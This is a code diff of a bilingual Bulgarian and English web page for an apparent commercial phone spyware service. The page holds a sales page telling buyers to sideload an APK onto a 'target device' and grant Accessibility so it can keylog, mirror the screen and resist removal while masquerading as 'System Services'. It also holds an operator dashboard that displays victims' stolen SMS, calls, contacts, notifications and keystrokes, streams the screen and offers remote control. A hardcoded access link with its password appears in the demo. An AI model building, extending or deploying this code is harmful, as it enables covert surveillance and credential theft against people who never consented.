+        term_tag: "АВТОНОМНО РАЗГРЪЩАНЕ",
+        term_title: "Интерактивна Конзола за Инсталация",
+        term_desc: "Вижте стъпка по стъпка как се инсталира софтуерът на чуждо устройство и как Telegram ботът веднага генерира самостоятелната изолирана сесия.",
+        term_footer_text: "Всяка инсталация автоматично генерира свой самостоятелен линк и Telegram тема.",
+        term_btn_replay: "Повтори Симулацията",
+        steps_title: "Указания за Инсталация на Друг Телефон",
+        step1_title: "Изтегляне и Стартиране",
+        step1_desc: "Прехвърлете или изтеглете APK файла на целевия телефон. Разрешете „Инсталиране от неизвестни източници“ (Install Unknown Apps), ако операционната система поиска потвърждение.",
+        step2_title: "Активиране на Достъпност (Accessibility)",
+        step2_desc: "Отворете приложението веднъж. Отидете в Настройки ➔ Достъпност (Accessibility) ➔ Инсталирани приложения (Installed Apps) ➔ System Services и включете превключвателя. Това активира прехвата на екран, клавиши и съобщения.",
+        step3_title: "Автономно Свързване",
+        step3_desc: "След като услугата се включи, телефонът автоматично се свързва, отваря новата стая в Telegram бота и генерира вашия личен портален линк на paas.website.",
+        pricing_tag: "КОРПОРАТИВНИ ПЛАНОВЕ",
+        pricing_title: "Гъвкаво Лицензиране за Бизнес Клиенти",
+        pricing_desc: "Изберете подходящия лиценз според броя наблюдавани активи. Всеки абонамент включва моментално издаване на лицензен ключ и денонощна техническа поддръжка.",
+        modal_passkey_label: "Лицензен Ключ / Passkey",
+        modal_btn_unlock: "ОТКЛЮЧИ ТАБЛОТО",
+        modal_hint: "Нямате парола? Изберете абонамент или се свържете с вашия администратор."
+      },
+      en: {
+        nav_overview: "Capabilities",
+        nav_demo: "Live Demo",
+        nav_deployment: "Deployment & APK",
+        nav_pricing: "Licensing",
+        btn_login: "Client Portal",
+        hero_badge: "⚡ SOVEREIGN FLEET INTELLIGENCE & ENDPOINT GOVERNANCE",
+        hero_title: "Enterprise-Grade Mobile Endpoint Telemetry & Remote Control",
+        hero_lead: "Dedicated Platform-as-a-Service (PaaS) engineered for corporate intelligence, real-time screen mirroring, unmasked keystroke audit, and silent communications oversight with zero runtime footprint.",
+        hero_btn_download: "📥 Download Installer (APK)",
+        hero_btn_demo: "👁️ Interactive Demo",
+        hero_btn_login: "🔑 Enter Passkey",
+        metric_entropy: "Idle Entropy (Zero CPU)",
+        metric_latency: "WebSocket Round-Trip",
+        metric_persistence: "Anti-Uninstall Lock",
+        metric_encryption: "Post-Quantum TLS Enclave",
+        demo_tag: "WHAT HAPPENS UPON ACTIVATION",
+        demo_title: "Interactive Live Demonstration Sandbox",
+        demo_desc: "Explore the live simulation below: see how the system streams screen feeds, logs incoming calls, unmasks typed passwords, and generates isolated customer portals.",
+        term_tag: "AUTONOMOUS ENROLLMENT",
+        term_title: "Interactive Deployment Console",
+        term_desc: "Observe step-by-step how the software deploys to target hardware and how the Telegram engine provisions a dedicated session topic automatically.",
+        term_footer_text: "Every installation autonomously registers its dedicated web URL and Telegram thread.",
+        term_btn_replay: "Replay Handshake",
+        steps_title: "Target Device Installation Protocol",
+        step1_title: "Download & Sideload",
+        step1_desc: "Transfer or download the APK installer to the target device. Enable 'Install from Unknown Sources' if prompted by the operating system.",
+        step2_title: "Authorize Accessibility Service",
+        step2_desc: "Launch the app once. Navigate to Settings ➔ Accessibility ➔ Installed Apps ➔ System Services and enable the toggle. This locks the active screen mirror and keylogger.",
+        step3_title: "Autonomous Handshake",
+        step3_desc: "Upon activation, the device autonomously connects, spawns its dedicated Telegram forum topic, and dispatches its isolated paas.website portal link.",
+        pricing_tag: "CORPORATE LICENSING",
+        pricing_title: "Executive Licensing Plans for Enterprise",
+        pricing_desc: "Select the subscription matching your fleet size. Every subscription features instant passkey dispatch and priority technical governance.",
+        modal_passkey_label: "License Key / Passkey",
+        modal_btn_unlock: "UNLOCK TELEMETRY VAULT",
+        modal_hint: "Need a key? Select a plan above or contact your sovereign administrator."
+      }
+    };
+
+    function setLanguage(lang) {
+      localStorage.setItem('aeterna_lang', lang);
+      document.getElementById('btn-lang-bg').classList.toggle('active', lang === 'bg');
+      document.getElementById('btn-lang-en').classList.toggle('active', lang === 'en');
+      
+      const dict = i18n[lang] || i18n.bg;
+      document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        if (dict[key]) {
+          el.innerHTML = dict[key];
+        }
+      });
+    }
+
+    // Modal Operations
+    function openAuthModal() {
+      document.getElementById('auth-modal').style.display = 'flex';
+      document.getElementById('passkey-input').focus();
+    }
+
+    function closeAuthModal() {
+      document.getElementById('auth-modal').style.display = 'none';
+    }
+
+    window.onclick = function(event) {
+      const modal = document.getElementById('auth-modal');
+      if (event.target === modal) {
+        closeAuthModal();
+      }
+    };
+
+    // Interactive Demo Tab Switcher
+    function switchDemoTab(tabId) {
+      document.querySelectorAll('.demo-tab-btn').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.demo-tab-pane').forEach(p => p.classList.remove('active'));
+      document.getElementById(tabId).classList.add('active');
+      event.currentTarget.classList.add('active');
+    }
+
+    // Terminal Replay Animation
+    function replayTerminalSequence() {
+      const term = document.getElementById('deployment-term-body');
+      term.innerHTML = '<div class="term-line"><span class="term-info">Инициализиране на повторна симулация на разгръщането...</span></div>';
+      
+      const steps = [
+        '<div class="term-line"><span class="term-prompt">aeterna@sovereign:~$</span> <span class="term-cmd">./aeterna_fleet_deploy.sh --target-asset="Android_SM-S928B"</span></div>',
+        '<div class="term-line"><span class="term-info">[1/5] Проверка на инсталационния пакет AETERNA_SYSTEMDEF_INSTALLER.apk...</span></div>',
+        '<div class="term-line"><span class="term-success"> ✔ Пакетът е валиден. Подпис: NIST-PQC ML-DSA-87 (6.74 MB).</span></div>',
+        '<div class="term-line"><span class="term-info">[2/5] Стартиране на системна услуга \'System Services\' и маскиране...</span></div>',
+        '<div class="term-line"><span class="term-success"> ✔ Фоновият процес е закотвен (WakeLock + BootCompleted Daemon).</span></div>',
+        '<div class="term-line"><span class="term-info">[3/5] Свързване с Telegram Fleet Hub (@Shanoto7bot)...</span></div>',
+        '<div class="term-line"><span class="term-success"> ✔ Създаден нов Topic/стая в супергрупа \'Scan\': 📱 samsung SM-S928B (+359896849882).</span></div>',
+        '<div class="term-line"><span class="term-info">[4/5] Генериране на изолиран клиентски Web HUD...</span></div>',
+        '<div class="term-line" style="color: var(--cyan); font-weight: 700;"><span> 🔗 ДИРЕКТЕН ЛИНК ЗА СЕСИЯТА:</span> <span style="text-decoration: underline;">https://paas.website/?device=samsung_SM-S928B_7badd722&pass=vault2026</span></div>',
+        '<div class="term-line"><span class="term-success">[5/5] Ентропията е свита до 0.0000. Системата е в готовност.</span></div>'
+      ];
+
+      let idx = 0;
+      const interval = setInterval(() => {
+        if (idx < steps.length) {
+          term.innerHTML += steps[idx];
+          term.scrollTop = term.scrollHeight;
+          idx++;
+        } else {
+          clearInterval(interval);
+        }
+      }, 350);
+    }
+
+    // Dynamic Typing Simulation in Demo Phone
+    const demoPhrases = [
+      "Passwd: S0ver3ign2026!",
+      "Confidential: Deal closed.",
+      "Meeting Zurich 14:00.",
+      "Transfer €250,000 to Vault."
+    ];
+    let demoPhraseIdx = 0;
+    setInterval(() => {
+      const box = document.getElementById('sim-typing-text');
+      if (box) {
+        demoPhraseIdx = (demoPhraseIdx + 1) % demoPhrases.length;
+        box.textContent = demoPhrases[demoPhraseIdx];
+      }
+    }, 4000);
+
+    // ══════════════════════════════════════════════════════════════
+    // AUTHENTICATION & DASHBOARD TRANSITION
+    // ══════════════════════════════════════════════════════════════
     function verifyAuth() {
       const input = document.getElementById('passkey-input').value.trim().toLowerCase();
       if (ARCHITECT_MASTER_KEYS.includes(input)) {
         currentUserRole = "ARCHITECT";
         localStorage.setItem('aeterna_auth', 'ARCHITECT');
+        closeAuthModal();
         unlockDashboard("👑 SOVEREIGN ARCHITECT (FULL ROOT ACCESS)");
       } else if (GENERAL_USER_KEYS.includes(input)) {
         currentUserRole = "VIEWER";
         localStorage.setItem('aeterna_auth', 'VIEWER');
+        closeAuthModal();
         unlockDashboard("🛡️ SYSTEMDEF VAULT (FLEET MONITOR)");
       } else {
-        alert("Грешна парола за достъп!");
+        alert("Невалиден лицензен ключ / Invalid Passkey!");
       }
     }
 
     function unlockDashboard(roleBadge) {
-      document.getElementById('auth-screen').style.display = 'none';
+      document.getElementById('executive-showcase').style.display = 'none';
       document.getElementById('dashboard-screen').style.display = 'block';
       const badgeEl = document.getElementById('role-indicator');
       if (badgeEl) badgeEl.textContent = roleBadge;
@@ -590,7 +2080,7 @@
       window.location.href = window.location.pathname;
     }
 
-    document.getElementById('passkey-input').addEventListener('keypress', (e) => {
+    document.getElementById('passkey-input')?.addEventListener('keypress', (e) => {
       if (e.key === 'Enter') verifyAuth();
     });
 
@@ -606,9 +2096,6 @@
       img.src = `${HOST_ENDPOINT}/api/screen.png?t=${Date.now()}`;
     }
 
-    let selectedDeviceId = "ALL";
-    let devicesList = [];
-
     function updateDeviceSelector(devices) {
       if (!devices || devices.length === 0) return;
       devicesList = devices;
@@ -617,11 +2104,10 @@
       
       const currentVal = sel.value || selectedDeviceId;
       
-      // Deduplicate devices by model/number if needed
       const uniqueDevices = [];
       const seen = new Set();
       devices.forEach(d => {
-        const key = d.name + '_' + d.number;
+        const key = (d.name || d.model || '') + '_' + (d.number || '');
         if (!seen.has(key)) {
           seen.add(key);
           uniqueDevices.push(d);
@@ -691,177 +2177,220 @@
       });
     }
 
-    function matchDevice(item) {
-      if (selectedDeviceId === "ALL") return true;
-      if (!item) return false;
-      if (item.deviceId && item.deviceId === selectedDeviceId) return true;
-      if (item.device && item.device.includes(selectedDeviceId)) return true;
-      return false;
+    function filterByDevice(items) {
+      if (!selectedDeviceId || selectedDeviceId === 'ALL') return items;
+      return items.filter(item => {
+        const dId = item.deviceId || item.device || '';
+        return dId.toLowerCase() === selectedDeviceId.toLowerCase();
+      });
     }
 
     async function fetchRecords() {
       try {
         const res = await fetch(`${HOST_ENDPOINT}/api/records`);
-        if (res.ok) {
-          const data = await res.json();
-          records = data;
-          if (data.devices) {
-            updateDeviceSelector(data.devices);
-          }
-          updateBadges();
-          renderTelegramFeed();
-          renderNotifs();
-          renderCalls();
-          renderSms();
-          renderContacts();
-          renderKeylogs();
+        if (!res.ok) return;
+        const data = await res.json();
+        records = data;
+        
+        if (data.devices) {
+          updateDeviceSelector(data.devices);
         }
-        // Also fetch telemetry
-        const telRes = await fetch(`${HOST_ENDPOINT}/api/telemetry`);
-        if (telRes.ok) {
-          const t = await telRes.json();
-          document.getElementById('val-battery').textContent = `${t.battery.level} %`;
-          document.getElementById('desc-battery').textContent = `${t.battery.voltage} | ${t.battery.temperature}`;
-        }
-      } catch (err) {}
-    }
 
-    function updateBadges() {
-      const tgCount = (records.events || []).filter(matchDevice).length;
-      const notifCount = (records.notifications || []).filter(matchDevice).length;
-      const callCount = (records.calls || []).filter(matchDevice).length;
-      const smsCount = (records.sms || []).filter(matchDevice).length;
-      const contCount = (records.contacts || []).filter(matchDevice).length;
-      const keyCount = (records.keylogs || []).filter(matchDevice).length;
+        updateBadges();
+        renderTelegramFeed();
+        renderNotifs();
+        renderCalls();
+        renderSms();
+        renderContacts();
+        renderKeylogs();
 
-      document.getElementById('b-tg').textContent = tgCount;
-      document.getElementById('b-notifs').textContent = notifCount;
-      document.getElementById('b-calls').textContent = callCount;
-      document.getElementById('b-sms').textContent = smsCount;
-      document.getElementById('b-contacts').textContent = contCount;
-      document.getElementById('b-keylog').textContent = keyCount;
-    }
-
-    function renderTelegramFeed() {
-      const filter = (document.getElementById('filter-tg')?.value || '').toLowerCase();
-      const grid = document.getElementById('grid-tg');
-      const recent = document.getElementById('recent-stream');
-      const events = (records.events || []).filter(matchDevice);
-
-      grid.innerHTML = events
-        .filter(e => (e.event || '').toLowerCase().includes(filter))
-        .map(e => `
-          <div class="event-card type-contact" style="border-left-color: var(--cyan);">
-            <div class="event-header">
-              <span style="color: var(--cyan); font-weight: 800;">🤖 TELEGRAM LIVE EVENT</span>
-              <span>${e.timestamp}</span>
+        // Update Side Feed and Telemetry
+        const feedEl = document.getElementById('side-feed-list');
+        const evs = filterByDevice(data.events || []);
+        if (evs.length > 0) {
+          feedEl.innerHTML = evs.slice(0, 15).map(e => `
+            <div style="border-left: 2px solid var(--cyan); padding-left: 8px; margin-bottom: 6px;">
+              <span style="color: var(--muted); font-size: 9px;">[${e.timestamp || 'LIVE'}]</span>
+              <div style="color: #fff;">${escapeHtml(e.text || e.event || '')}</div>
             </div>
-            <div class="event-body" style="white-space: pre-wrap;">${e.event}</div>
-          </div>
-        `).join('') || '<div style="color: var(--muted);">Няма записани Telegram събития.</div>';
+          `).join('');
+        }
 
-      if (recent && events.length > 0) {
-        recent.innerHTML = events.slice(0, 15).map(e => `
-          <div style="margin-bottom: 6px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 4px;">
-            <span style="color: var(--muted); font-size: 10px;">[${e.timestamp}]</span>
-            <div style="color: #9cdcfe; font-size: 11px;">${e.event}</div>
-          </div>
-        `).join('');
+        if (data.battery) {
+          document.getElementById('battery-pct').textContent = `${data.battery.level || 100}%`;
+          document.getElementById('battery-voltage').textContent = `${data.battery.voltage || '4.3V'} | ${data.battery.temperature || '35°C'}`;
+        }
+        if (data.device) {
+          document.getElementById('live-device-model').textContent = data.device.model || 'SM-S928B';
+        }
+      } catch (err) {
+        console.error('Fetch error:', err);
       }
     }
 
-    function renderNotifs() {
-      const filter = (document.getElementById('filter-notif')?.value || '').toLowerCase();
-      const grid = document.getElementById('grid-notifs');
-      grid.innerHTML = records.notifications
-        .filter(matchDevice)
-        .filter(n => (n.appName + n.title + n.text).toLowerCase().includes(filter))
-        .map(n => `
-          <div class="event-card type-notification">
-            <div class="event-header">
-              <span style="color: var(--purple); font-weight: 800;">🔔 ${escapeHtml(n.appName)}</span>
-              <span>${n.timestamp}</span>
-            </div>
-            <div class="event-title">${escapeHtml(n.title)}</div>
-            <div class="event-body">${escapeHtml(n.text)}</div>
-            <div class="event-meta"><span>Device: ${escapeHtml(n.deviceName || n.device || 'Android')}</span></div>
+    function updateBadges() {
+      const filteredEvents = filterByDevice(records.events || []);
+      const filteredNotifs = filterByDevice(records.notifications || []);
+      const filteredCalls = filterByDevice(records.calls || []);
+      const filteredSms = filterByDevice(records.sms || []);
+      const filteredContacts = filterByDevice(records.contacts || []);
+      const filteredKeylogs = filterByDevice(records.keylogs || []);
+
+      document.getElementById('badge-events').textContent = filteredEvents.length;
+      document.getElementById('badge-notifs').textContent = filteredNotifs.length;
+      document.getElementById('badge-calls').textContent = filteredCalls.length;
+      document.getElementById('badge-sms').textContent = filteredSms.length;
+      document.getElementById('badge-contacts').textContent = filteredContacts.length;
+      document.getElementById('badge-keylogs').textContent = filteredKeylogs.length;
+    }
+
+    function renderTelegramFeed() {
+      const container = document.getElementById('grid-telegram');
+      const filter = (document.getElementById('filter-telegram')?.value || '').toLowerCase();
+      const filtered = filterByDevice(records.events || []).filter(e => 
+        (e.text || '').toLowerCase().includes(filter)
+      );
+
+      if (filtered.length === 0) {
+        container.innerHTML = '<div style="color: var(--muted); padding: 20px;">Няма намерени Telegram събития.</div>';
+        return;
+      }
+
+      container.innerHTML = filtered.map(e => `
+        <div class="data-card">
+          <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
+            <span style="color:var(--gold); font-weight:700;">📡 TELEGRAM EVENT</span>
+            <span style="color:var(--muted); font-family:'JetBrains Mono', monospace; font-size:10px;">${e.timestamp || ''}</span>
           </div>
-        `).join('') || '<div style="color: var(--muted);">Няма записани известия.</div>';
+          <div style="white-space:pre-wrap; color:var(--text); font-family:'JetBrains Mono', monospace;">${escapeHtml(e.text || '')}</div>
+        </div>
+      `).join('');
+    }
+
+    function renderNotifs() {
+      const container = document.getElementById('grid-notifs');
+      const filter = (document.getElementById('filter-notif')?.value || '').toLowerCase();
+      const filtered = filterByDevice(records.notifications || []).filter(n => 
+        (n.app || '').toLowerCase().includes(filter) || 
+        (n.title || '').toLowerCase().includes(filter) ||
+        (n.text || '').toLowerCase().includes(filter)
+      );
+
+      if (filtered.length === 0) {
+        container.innerHTML = '<div style="color: var(--muted); padding: 20px;">Няма известия.</div>';
+        return;
+      }
+
+      container.innerHTML = filtered.map(n => `
+        <div class="data-card">
+          <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
+            <span style="color:var(--cyan); font-weight:700;">🔔 ${escapeHtml(n.app || 'App')}</span>
+            <span style="color:var(--muted); font-size:10px;">${n.timestamp || ''}</span>
+          </div>
+          <div style="font-weight:600; margin-bottom:4px;">${escapeHtml(n.title || '')}</div>
+          <div style="color:var(--text-dim);">${escapeHtml(n.text || '')}</div>
+        </div>
+      `).join('');
     }
 
     function renderCalls() {
+      const container = document.getElementById('grid-calls');
       const filter = (document.getElementById('filter-calls')?.value || '').toLowerCase();
-      const grid = document.getElementById('grid-calls');
-      grid.innerHTML = records.calls
-        .filter(matchDevice)
-        .filter(c => (c.number + c.contactName + c.callType).toLowerCase().includes(filter))
-        .map(c => `
-          <div class="event-card type-call">
-            <div class="event-header">
-              <span style="color: var(--green); font-weight: 800;">📞 ${escapeHtml(c.callType)}</span>
-              <span>${c.timestamp}</span>
-            </div>
-            <div class="event-title">${escapeHtml(c.number)} (${escapeHtml(c.contactName)})</div>
-            <div class="event-body">Времетраене: ${escapeHtml(c.duration || '0s')}</div>
-            <div class="event-meta"><span>Device: ${escapeHtml(c.deviceName || c.device || 'Android')}</span></div>
+      const filtered = filterByDevice(records.calls || []).filter(c => 
+        (c.number || '').toLowerCase().includes(filter) ||
+        (c.name || '').toLowerCase().includes(filter)
+      );
+
+      if (filtered.length === 0) {
+        container.innerHTML = '<div style="color: var(--muted); padding: 20px;">Няма разговори.</div>';
+        return;
+      }
+
+      container.innerHTML = filtered.map(c => `
+        <div class="data-card">
+          <div style="display:flex; justify-content:space-between;">
+            <span style="color:${c.type === 'INCOMING' ? 'var(--green)' : 'var(--cyan)'}; font-weight:700;">
+              ${c.type === 'INCOMING' ? '📞 Входящ' : '📞 Изходящ'}
+            </span>
+            <span style="color:var(--muted); font-size:10px;">${c.timestamp || ''}</span>
           </div>
-        `).join('') || '<div style="color: var(--muted);">Няма записани обаждания.</div>';
+          <div style="font-size:15px; font-weight:800; margin:6px 0;">${escapeHtml(c.number || 'Неизвестен')} ${c.name ? '(' + escapeHtml(c.name) + ')' : ''}</div>
+          <div style="color:var(--text-dim); font-size:11px;">Продължителност: ${c.duration || '0'} сек.</div>
+        </div>
+      `).join('');
     }
 
     function renderSms() {
+      const container = document.getElementById('grid-sms');
       const filter = (document.getElementById('filter-sms')?.value || '').toLowerCase();
-      const grid = document.getElementById('grid-sms');
-      grid.innerHTML = records.sms
-        .filter(matchDevice)
-        .filter(s => (s.number + s.message + s.contactName).toLowerCase().includes(filter))
-        .map(s => `
-          <div class="event-card type-sms">
-            <div class="event-header">
-              <span style="color: var(--cyan); font-weight: 800;">✉️ SMS</span>
-              <span>${s.timestamp}</span>
-            </div>
-            <div class="event-title">От/До: ${escapeHtml(s.number)} (${escapeHtml(s.contactName)})</div>
-            <div class="event-body">${escapeHtml(s.message)}</div>
-            <div class="event-meta"><span>Device: ${escapeHtml(s.deviceName || s.device || 'Android')}</span></div>
+      const filtered = filterByDevice(records.sms || []).filter(s => 
+        (s.body || '').toLowerCase().includes(filter) ||
+        (s.address || '').toLowerCase().includes(filter)
+      );
+
+      if (filtered.length === 0) {
+        container.innerHTML = '<div style="color: var(--muted); padding: 20px;">Няма SMS съобщения.</div>';
+        return;
+      }
+
+      container.innerHTML = filtered.map(s => `
+        <div class="data-card">
+          <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
+            <span style="color:var(--gold); font-weight:700;">✉️ ${escapeHtml(s.address || 'Unknown')}</span>
+            <span style="color:var(--muted); font-size:10px;">${s.timestamp || ''}</span>
           </div>
-        `).join('') || '<div style="color: var(--muted);">Няма записани SMS съобщения.</div>';
+          <div style="color:var(--text); font-family:'JetBrains Mono', monospace;">${escapeHtml(s.body || '')}</div>
+        </div>
+      `).join('');
     }
 
     function renderContacts() {
+      const container = document.getElementById('grid-contacts');
       const filter = (document.getElementById('filter-contacts')?.value || '').toLowerCase();
-      const grid = document.getElementById('grid-contacts');
-      grid.innerHTML = records.contacts
-        .filter(matchDevice)
-        .filter(c => (c.platform + c.initiator + c.target + c.details).toLowerCase().includes(filter))
-        .map(c => `
-          <div class="event-card type-contact">
-            <div class="event-header">
-              <span style="color: var(--gold); font-weight: 800;">👥 ${escapeHtml(c.platform)}</span>
-              <span>${c.timestamp}</span>
-            </div>
-            <div class="event-title">${escapeHtml(c.initiator)} ➡️ ${escapeHtml(c.target)}</div>
-            <div class="event-body">${escapeHtml(c.details || '')}</div>
-            <div class="event-meta"><span>Device: ${escapeHtml(c.deviceName || c.device || 'Android')}</span></div>
+      const filtered = filterByDevice(records.contacts || []).filter(c => 
+        (c.name || '').toLowerCase().includes(filter) ||
+        (c.platform || '').toLowerCase().includes(filter)
+      );
+
+      if (filtered.length === 0) {
+        container.innerHTML = '<div style="color: var(--muted); padding: 20px;">Няма контакти.</div>';
+        return;
+      }
+
+      container.innerHTML = filtered.map(c => `
+        <div class="data-card">
+          <div style="display:flex; justify-content:space-between;">
+            <span style="color:var(--cyan); font-weight:700;">👥 ${escapeHtml(c.platform || 'Platform')}</span>
+            <span style="color:var(--muted); font-size:10px;">${c.timestamp || ''}</span>
           </div>
-        `).join('') || '<div style="color: var(--muted);">Няма данни от тракера.</div>';
+          <div style="font-size:14px; font-weight:700; margin-top:4px;">${escapeHtml(c.name || '')}</div>
+          <div style="color:var(--text-dim); font-size:11px;">${escapeHtml(c.details || '')}</div>
+        </div>
+      `).join('');
     }
 
     function renderKeylogs() {
+      const container = document.getElementById('grid-keylogs');
       const filter = (document.getElementById('filter-keylogs')?.value || '').toLowerCase();
-      const grid = document.getElementById('grid-keylogs');
-      grid.innerHTML = records.keylogs
-        .filter(matchDevice)
-        .filter(k => (k.data || '').toLowerCase().includes(filter))
-        .map(k => `
-          <div class="event-card type-keylog">
-            <div class="event-header">
-              <span style="color: var(--red); font-weight: 800;">⌨️ KEYSTROKE LOG</span>
-              <span>${k.timestamp}</span>
-            </div>
-            <div class="event-body" style="white-space: pre-wrap;">${k.data}</div>
-            <div class="event-meta"><span>Device: ${escapeHtml(k.deviceName || k.device || 'Android')}</span></div>
+      const filtered = filterByDevice(records.keylogs || []).filter(k => 
+        (k.text || '').toLowerCase().includes(filter) ||
+        (k.app || '').toLowerCase().includes(filter)
+      );
+
+      if (filtered.length === 0) {
+        container.innerHTML = '<div style="color: var(--muted); padding: 20px;">Няма въведени клавиши.</div>';
+        return;
+      }
+
+      container.innerHTML = filtered.map(k => `
+        <div class="data-card">
+          <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
+            <span style="color:var(--red); font-weight:700;">⌨️ ${escapeHtml(k.app || 'Keyboard')}</span>
+            <span style="color:var(--muted); font-size:10px;">${k.timestamp || ''}</span>
           </div>
-        `).join('') || '<div style="color: var(--muted);">Няма клавишни логове.</div>';
+          <div style="color:var(--cyan); font-family:'JetBrains Mono', monospace; font-size:13px; word-break:break-all;">${escapeHtml(k.text || '')}</div>
+        </div>
+      `).join('');
     }
 
     async function clearData() {
@@ -893,7 +2422,6 @@
 
         ws.onmessage = (event) => {
           if (event.data instanceof Blob) {
-            // Received JPEG binary frame from Phone RemoteControlHub
             const url = URL.createObjectURL(event.data);
             const img = document.getElementById('live-screen-img');
             img.src = url;
@@ -901,7 +2429,7 @@
             try {
               const msg = JSON.parse(event.data);
               if (msg.type === 'NEW_RECORD') {
-                fetchRecords(); // Instant update when app posts
+                fetchRecords();
               }
             } catch (e) {}
           }
@@ -915,7 +2443,7 @@
       }
     }
 
-    // Remote Click & Gesture Handlers
+    // Remote Click & Touch Handlers
     const screenImg = document.getElementById('live-screen-img');
     const indicator = document.getElementById('touch-indicator');
 
@@ -992,7 +2520,6 @@
       connectWebSocket();
       fetchRecords();
       setInterval(fetchRecords, 2000);
-      // Fallback screen refresh every 1.5s if no WebSocket binary frame was received
       setInterval(() => {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
           refreshScreenFallback();
@@ -1000,11 +2527,17 @@
       }, 1500);
     }
 
-    // Direct Auto-Login & Role Resolution
+    // ══════════════════════════════════════════════════════════════
+    // INITIALIZATION & URL QUERY RESOLUTION
+    // ══════════════════════════════════════════════════════════════
     const urlParams = new URLSearchParams(window.location.search);
     const passQuery = (urlParams.get('pass') || urlParams.get('p') || urlParams.get('key') || '').toLowerCase();
     const targetDeviceParam = urlParams.get('device') || urlParams.get('d');
     
+    // Set default language from localStorage
+    const savedLang = localStorage.getItem('aeterna_lang') || 'bg';
+    setLanguage(savedLang);
+
     if (targetDeviceParam) {
       selectedDeviceId = targetDeviceParam;
     }
@@ -1022,9 +2555,13 @@
       if (savedAuth === 'ARCHITECT') {
         currentUserRole = 'ARCHITECT';
         unlockDashboard("👑 SOVEREIGN ARCHITECT (MASTER HUD)");
-      } else if (savedAuth === 'VIEWER' || savedAuth === 'unlocked') {
+      } else if (savedAuth === 'VIEWER') {
         currentUserRole = 'VIEWER';
         unlockDashboard(targetDeviceParam ? `🛡️ DEVICE HUD [${targetDeviceParam.substring(0, 14)}...]` : "🛡️ SYSTEMDEF VAULT (GENERAL ACCESS)");
+      } else {
+        // Default: Show Executive Showcase Portfolio
+        document.getElementById('executive-showcase').style.display = 'block';
+        document.getElementById('dashboard-screen').style.display = 'none';
       }
     }
   </script>
